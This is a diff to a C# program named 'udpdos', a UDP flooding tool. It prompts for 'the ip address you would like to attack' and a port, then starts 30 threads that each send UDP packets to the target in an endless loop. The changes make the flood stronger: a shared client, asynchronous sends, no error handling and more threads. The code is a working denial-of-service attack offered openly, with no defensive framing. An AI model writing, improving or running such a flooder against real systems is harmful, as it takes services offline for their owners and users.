@@ -3,6 +3,7 @@ using System.Net.Sockets;
 using System.Net;
 using System.Text;
 using System.Timers;
+using System.ComponentModel;
 
 
 public class udpdos
@@ -12,13 +13,21 @@ public class udpdos
     public static string ipaddr;
     public static Random rnd = new Random();
     public static int port;
+    public static UdpClient udpClient = new UdpClient();
+
     public static void Main(string[] args)
     {
+        /*for (int i = 0; i < sendbuf.Length; i++)
+        {
+            sendbuf[i] = Convert.ToByte(rnd.NextInt64(100));
+        }*/
+
         Console.WriteLine("Enter in the ip address you would like to attack. ");
         ipaddr = Console.ReadLine();
 
         Console.WriteLine("Enter in the port:");
         port = int.Parse(Console.ReadLine());
+
 
         startThreads();
         Thread temp = new Thread(new ThreadStart(timer));
@@ -27,24 +36,12 @@ public class udpdos
     }
     public static void scream()
     {
-        UdpClient udpClient = new UdpClient();
-        /*while (true)
+        //UdpClient udpClient = new UdpClient();
+        while (true)
         {
-            try
-            {*/
-                while (true)
-                {
-                    //port = rnd.Next(1000, 65535);
-                    udpClient.Send(sendbuf, sendbuf.Length, ipaddr, port);
-                    count++;
-                }
-            /*}
-            catch (Exception e)
-            {
-                Console.WriteLine(e.ToString());
-            }
-        }*/
-
+            udpClient.SendAsync(sendbuf, sendbuf.Length, ipaddr, port);
+            count++;
+        }
 
     }
     public static void timer()
@@ -59,7 +56,7 @@ public class udpdos
     }
     public static void startThreads()
     {
-        for (int i = 0; i < 28; i++)
+        for (int i = 0; i < 30; i++)
         {
             Thread listenThread = new Thread(new ThreadStart(scream));
             listenThread.Start();
